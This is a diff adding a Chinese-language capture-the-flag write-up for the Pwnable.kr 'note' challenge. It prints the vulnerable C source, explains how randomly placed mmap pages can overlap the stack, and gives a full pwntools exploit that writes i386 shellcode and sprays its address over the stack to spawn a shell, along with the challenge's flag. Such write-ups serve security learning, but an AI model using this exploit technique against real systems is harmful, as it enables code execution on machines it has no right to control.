@@ -16617,3 +16617,298 @@ io.close()
 
 ------
 
+### note
+
+这是**Pwnable.kr**的第三十六个挑战`note`，来自**[Rookiss]**部分。
+
+```bash
+Check out my SECURITY PATCH for mmap().
+despite no-ASLR setting, it will randomize memory layout.
+so it will contribute for exploit mitigation.
+wanna try sample application?
+
+
+ssh note@pwnable.kr -p2222 (pw:guest)
+```
+
+首先通过`ssh`远程连接目标主机。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ ssh note@pwnable.kr -p2222
+note@pwnable.kr's password: 
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
+|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+                                                                     
+- Site admin : daehee87@khu.ac.kr
+- irc.netgarage.org:6667 / #pwnable.kr
+- Simply type "irssi" command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+You have new mail.
+Last login: Sun Jun 25 11:52:32 2023 from 14.22.11.165
+```
+
+然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。
+
+```bash
+note@pwnable:~$ ls -la
+total 40
+drwxr-x---   5 root note  4096 Oct 23  2016 .
+drwxr-xr-x 117 root root  4096 Nov 10  2022 ..
+d---------   2 root root  4096 Sep 21  2015 .bash_history
+dr-xr-xr-x   2 root root  4096 Sep 21  2015 .irssi
+-rwxr-xr-x   1 root root 12027 Sep 21  2015 note
+-rw-r--r--   1 root root  3834 Sep 23  2015 note.c
+drwxr-xr-x   2 root root  4096 Oct 23  2016 .pwntools-cache
+-rw-r--r--   1 root root   210 Sep 21  2015 readme
+```
+
+输入`cat note.c`查看`note.c`的源代码。这个程序貌似是为了展示使用安全的内存映射函数`mmap_s`可以获取安全的随机地址，即使在没有ASLR（地址空间布局随机化）的32位系统中也可以如此。然而`select_menu();`会一直递归调用，消耗堆栈内存。此外，`write_note`申请的堆读写权限是全开的。`mmap_s()`函数中有概率让堆和栈的位置交叠，可以从`addr = (void *)(((int)addr & 0xFFFFF000) | 0x80000000);`这行代码看出。`mmap`开启了`MAP_FIXED flag`时，栈上的数据将会被舍弃，正因如此堆与栈数据重叠而不冲突时才能在栈上邻近的位置分配内存。如何去预测堆和栈交叠的时刻？只能爆破猜，因为栈增长的大小是固定不变的，而栈的起始地址由于ASLR的存在难以预测，加上堆的地址生成来自于随机分配，exp成功的概率极小，需要多次尝试。
+
+```c
+note@pwnable:~$ cat note.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#define PAGE_SIZE 4096
+
+void* mmap_s(void* addr, size_t length, int prot, int flags, int fd, off_t offset);
+void* mem_arr[257];  // 指针数组mem_arr用于存储创建的笔记的地址
+// clear_newlines()函数用于清除输入缓冲区中的换行符
+void clear_newlines(void){  
+    int c;
+    do{
+        c = getchar();
+    }while (c != '\n' && c != EOF);
+}
+// create_note()函数用于创建一个新的笔记。首先查找mem_arr中的第一个空槽位，使用mmap_s函数分配一页内存，并将地址存储在相应的槽位中。
+void create_note(){
+    int i;
+    void* ptr;
+    for(i=0; i<256; i++){
+        if(mem_arr[i] == NULL){
+            ptr = mmap_s((void*)NULL, PAGE_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+            mem_arr[i] = ptr;
+            printf("note created. no %d\n [%08x]", i, (int)ptr);
+            return;
+        }
+    }
+    printf("memory sults are fool\n");
+    return;
+}
+// write_note()函数用于向指定的笔记中写入内容。它首先要求用户输入笔记的编号，然后检查编号是否有效并且对应的笔记是否存在。如果存在，则要求用户输入要写入的内容，并使用gets函数将内容存储到相应的内存地址中。
+void write_note(){
+    unsigned int no;
+    printf("note no?\n");
+    scanf("%d", &no);
+    clear_newlines();
+    if(no>256){
+        printf("index out of range\n");
+        return;
+    }
+    if(mem_arr[no]==NULL){
+        printf("empty slut!\n");
+        return;
+    }
+    printf("paste your note (MAX : 4096 byte)\n");
+    gets(mem_arr[no]);
+}
+// read_note()函数用于读取指定的笔记内容。它首先要求用户输入笔记的编号，然后检查编号是否有效并且对应的笔记是否存在。如果存在，则将存储在相应内存地址中的内容打印出来。
+void read_note(){
+    unsigned int no;
+    printf("note no?\n");
+    scanf("%d", &no);
+    clear_newlines();
+    if(no>256){
+        printf("index out of range\n");
+        return;
+    }
+    if(mem_arr[no]==NULL){
+        printf("empty slut!\n");
+        return;
+    }
+    printf("%s\n", mem_arr[no]);
+}
+// delete_note()函数用于删除指定的笔记。它首先要求用户输入笔记的编号，然后检查编号是否有效并且对应的笔记是否存在。如果存在，则使用munmap函数释放相应的内存，并将相应的槽位设置为NULL。
+void delete_note(){
+    unsigned int no;
+    printf("note no?\n");
+    scanf("%d", &no);
+    clear_newlines();
+    if(no>256){
+        printf("index out of range\n");
+        return;
+    }
+    if(mem_arr[no]==NULL){
+        printf("already empty slut!\n");
+        return;
+    }
+    munmap(mem_arr[no], PAGE_SIZE);
+    mem_arr[no] = NULL;
+}
+// select_menu函数是一个循环菜单，用于提供不同的操作选项。它要求用户选择一个菜单选项，并根据选择调用相应的函数。
+void select_menu(){
+    // menu
+    int menu;
+    char command[1024];
+
+    printf("- Select Menu -\n");
+    printf("1. create note\n");
+    printf("2. write note\n");
+    printf("3. read note\n");
+    printf("4. delete note\n");
+    printf("5. exit\n");
+    scanf("%d", &menu);
+    clear_newlines();
+
+    switch(menu){
+        case 1:
+            create_note();
+            break;
+
+        case 2:
+            write_note();
+            break;
+
+        case 3:
+            read_note();
+            break;
+
+        case 4:
+            delete_note();
+            break;
+
+        case 5:
+            printf("bye\n");
+            return;
+
+        case 0x31337:
+            printf("welcome to hacker's secret menu\n");
+            printf("i'm sure 1byte overflow will be enough for you to pwn this\n");
+            fgets(command, 1025, stdin);
+            break;
+
+        default:
+            printf("invalid menu\n");
+            break;
+    }
+    select_menu();  // 此处存在问题 这显示菜单的函数居然是通过递归调用来实现的
+}
+
+int main(){
+    setvbuf(stdout, 0, _IONBF, 0);
+    setvbuf(stdin, 0, _IOLBF, 0);
+
+    printf("welcome to pwnable.kr\n\n");
+    sleep(2);
+    printf("recently I noticed that in 32bit system with no ASLR,\n");
+    printf(" mmap(NULL... gives predictable address\n\n");
+    sleep(2);
+    printf("I believe this is not secure in terms of software exploit mitigation\n");
+    printf("so I fixed this feature and called mmap_s\n\n");
+    sleep(2);
+    printf("please try out this sample note application to see how mmap_s works\n");
+    printf("you will see mmap_s() giving true random address despite no ASLR\n\n");
+    sleep(2);
+    printf("I think security people will thank me for this :)\n\n");
+    sleep(2);
+
+    select_menu();
+    return 0;
+}
+
+// secure mmap
+void* mmap_s(void* addr, size_t length, int prot, int flags, int fd, off_t offset){
+    // security fix: current version of mmap(NULL.. is not giving secure random address
+    if(addr == NULL && !(flags & MAP_FIXED) ){
+        void* tmp=0;
+        int fd = open("/dev/urandom", O_RDONLY);
+        if(fd==-1) exit(-1);
+        if(read(fd, &addr, 4)!=4) exit(-1);
+        close(fd);
+        // to avoid heap fragmentation, lets skip malloc area
+        addr = (void*)( ((int)addr & 0xFFFFF000) | 0x80000000 );
+
+        while(1){
+            // linearly search empty page (maybe this can be improved)
+            tmp = mmap(addr, length, prot, flags | MAP_FIXED, fd, offset);
+            if(tmp != MAP_FAILED){
+                return tmp;
+            }
+            else{
+                // memory already in use!
+                addr = (void*)((int)addr + PAGE_SIZE);  // choose adjacent page
+            }
+        }
+    }
+    return mmap(addr, length, prot, flags, fd, offset);
+}
+```
+
+编写`Python`代码求解，多次尝试后得到`flag`：`FYI mmap_s stands for mmap_stupid :p`。
+
+```python
+from pwn import *
+
+io = process("./note")
+def create_note():
+    io.sendlineafter(b'5. exit\n', b'1')
+    io.recvuntil(b'no ')
+    addr_no = int(io.recvline(), 10)
+    io.recvuntil(b' [')
+    addr = int(io.recvuntil(b']')[:-1], 16)
+    log.success('Create {} note at: {}'.format(addr_no, hex(addr)))
+    return addr_no, addr
+
+def write_note(no, msg): # no: int, msg: bytes
+    io.sendlineafter(b'5. exit\n', b'2')
+    io.recvline() # note no?
+    io.sendline(str(no).encode())
+    io.recvuntil(b'paste your note (MAX : 4096 byte)\n')
+    io.sendline(msg)
+
+def delete_note(no):
+    io.sendlineafter(b'5. exit\n', b'4')
+    io.recvuntil(b'note no?\n')
+    io.sendline(str(no).encode())
+    log.success("Delete note: %s"%str(no))
+
+stack_addr = 0xffffffff
+stack_no = 0
+while True:
+    no, addr = create_note()
+    if no == 255:
+        for i in range(256):
+            delete_note(i)
+        stack_addr -= 0x430*255
+    stack_addr -= 0x430
+    if addr > stack_addr:
+        stack_no = no
+        stack_addr = addr
+        break
+    log.success('Heap at: %#x\n', addr)
+    log.success('Stack at: %#x\n', stack_addr)
+
+
+shellcode = asm(shellcraft.i386.linux.sh())
+shellcode_no, shellcode_addr = create_note()
+write_note(shellcode_no, shellcode.rjust(200, b'\x90'))
+write_note(stack_no, p32(shellcode_addr)*1024)
+io.sendlineafter(b'5. exit\n', b'5')
+io.interactive()
+```
+
+------
+
